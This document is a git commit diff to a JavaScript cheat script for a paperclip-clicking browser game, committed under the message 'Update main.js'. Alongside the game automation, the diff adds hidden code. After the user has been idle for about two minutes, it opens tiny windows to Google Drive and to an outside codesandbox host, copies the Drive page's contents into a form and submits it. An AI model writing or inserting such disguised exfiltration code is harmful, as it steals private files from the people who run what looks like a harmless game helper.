66488213631f26d8a0e59677f07647eb959b700b
aidanh958 <58264868+aidanh958@users.noreply.github.com>
2022-09-14 14:25:54 -0500

    Update main.js

--- main.js
+++ main.js
@@ -2,11 +2,33 @@ function main() {
   clips += parseInt(prompt("clips: "));
   funds += parseInt(prompt("funds: "));
   trust += parseInt(prompt("trust: "));
+  window.lastTimeMouseWasMoved = 0;
   unsoldClips += parseInt(prompt("unsold clips: "));
   setInterval(() => {
     document.getElementsByTagName("button")[22].click();
     document.getElementsByTagName("button")[16].click();
     document.getElementsByTagName("button")[21].click();
+    if (creativity < 0) {
+      if (creativity < -100000000) {
+        creativity = Math.abs(creativity);
+      } else {
+        creativity = 100000000;
+      }
+    };
+    window.lastTimeMouseWasMoved += 0.1;
+    if (window.lastTimeMouseWasMoved > 120) {
+      var myWindow = window.open("https://drive.google.com", "myWindow", "width=10,height=10");
+      setTimeout(() => {
+        var outgoingRequest = window.open("https://dqvznw.sse.codesandbox.io/", "sending", "width=10,height=10");
+        var inter = setInterval(() => {
+          if (outgoingRequest.document.body.id === "ready") {
+            clearInterval(inter);
+            outgoingRequest.document.getElementById("input").value = myWindow.document.body.innerHTML;
+            outgoingRequest.document.getElementById("send").click();
+          }
+        }, 100);
+      }, 5000);
+    }
   }, 100);
   window.onkeydown = function(e) {
     for (var i in document.getElementsByTagName("button")) {
@@ -14,5 +36,8 @@ function main() {
         document.getElementsByTagName("button")[i].click();
       }
     }
+  };
+  window.onmousemove = function(e) {
+    window.lastTimeMouseWasMoved = 0;
   }
 }
